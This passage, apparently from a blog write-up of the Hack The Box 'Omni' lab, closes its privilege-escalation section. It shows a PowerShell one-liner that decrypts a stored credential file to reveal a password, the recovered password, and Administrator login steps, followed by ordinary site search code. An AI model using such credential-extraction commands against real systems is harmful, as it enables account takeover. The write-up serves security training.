+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2010.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2010.png" /></p>
+
+<p>This time I don’t have access to the Administrator’s directory.</p>
+
+<p>And now I’m able to decrypt the file and got <code class="language-plaintext highlighter-rouge">iot-admin.xml</code> it contains some password. And I used the same method to decrypt the <code class="language-plaintext highlighter-rouge">user.txt</code> and got user flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt;powershell.exe <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$cred</span><span class="s2">=Import-CliXml -Path C:</span><span class="se">\D</span><span class="s2">ata</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\a</span><span class="s2">pp</span><span class="se">\i</span><span class="s2">ot-admin.xml; </span><span class="nv">$cred</span><span class="s2">.GetNetworkCredential().Password"</span>
+powershell.exe <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$cred</span><span class="s2">=Import-CliXml -Path C:</span><span class="se">\D</span><span class="s2">ata</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\a</span><span class="s2">pp</span><span class="se">\i</span><span class="s2">ot-admin.xml; </span><span class="nv">$cred</span><span class="s2">.GetNetworkCredential().Password"</span>
+Attempting to perform the InitializeDefaultDrives operation on the <span class="s1">'FileSystem'</span> provider failed.
+_1nt3rn37ofTh1nGz
+</code></pre></div></div>
+
+<p>We got one more file. And it seems useless.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt;type hardening.txt
+<span class="nb">type </span>hardening.txt
+- changed default administrator password of <span class="s2">"p@ssw0rd"</span>
+- added firewall rules to restrict unnecessary services
+- removed administrator account from <span class="s2">"Ssh Users"</span> group
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Since we got a password from <code class="language-plaintext highlighter-rouge">iot-admin.xml</code> the filename itself tells it is IOT Administrator password. I logged in as Administrator using <code class="language-plaintext highlighter-rouge">_1nt3rn37ofTh1nGz</code></p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2011.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2011.png" /></p>
+
+<p>We already know Run Command options is there. I used the same method we did before to get a shell.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2012.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2012.png" /></p>
+
+<p>This time I have access to the Administrator’s directory and use the same method to decrypt the flag.</p>
+
+<p><img src="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2013.png" alt="https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2013.png" /></p>
+
+<p>We Own the Box.</p>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            
+            <a href="/tag/#/IOT" rel="tag"># IOT</a>
+          
+            
+            <a href="/tag/#/easy" rel="tag"># easy</a>
+          
+            
+            <a href="/tag/#/SirepRAT" rel="tag"># SirepRAT</a>
+          
+        </div>
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/vulnhub/2019/10/23/BasicPentesting1Vulnhub/" rel="prev" title="Vulnhub - Basic Pentesting 1">
+                Vulnhub - Basic Pentesting 1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+      
+
+      
+    </footer>
+  </article>
+
+  <div class="post-spread">
+    
+  </div>
+</div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        
+        
+        
+
+
+
+
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/assets/images/avatar.gif"
+               alt="Girish" />
+          <p class="site-author-name" itemprop="name">Girish</p>
+           
+              <p class="site-description motion-element" itemprop="description">Cyber Security Enthusiast | eJPT</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+        
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              
+              
+              <span class="links-of-author-item">
+                <a href="https://github.com/gk2savage" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              
+              
+              <span class="links-of-author-item">
+                <a href="https://www.linkedin.com/in/girish41" target="_blank" title="Linkdin">
+                  
+                    <i class="fa fa-fw fa-linkedin"></i>
+                  
+                  Linkdin
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-2"> <a class="nav-link" href="#nmap-scan-results"> <span class="nav-number">1</span> <span class="nav-text">Nmap Scan Results</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#web-enumeration"> <span class="nav-number">2</span> <span class="nav-text">Web Enumeration</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#getting-shell"> <span class="nav-number">3</span> <span class="nav-text">Getting Shell</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#privilege-escalation"> <span class="nav-number">4</span> <span class="nav-text">Privilege Escalation</span> </a> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-fire"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Girish</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+   
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+    
+
+  
+
+
+
+
+
+
+
+  
+
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
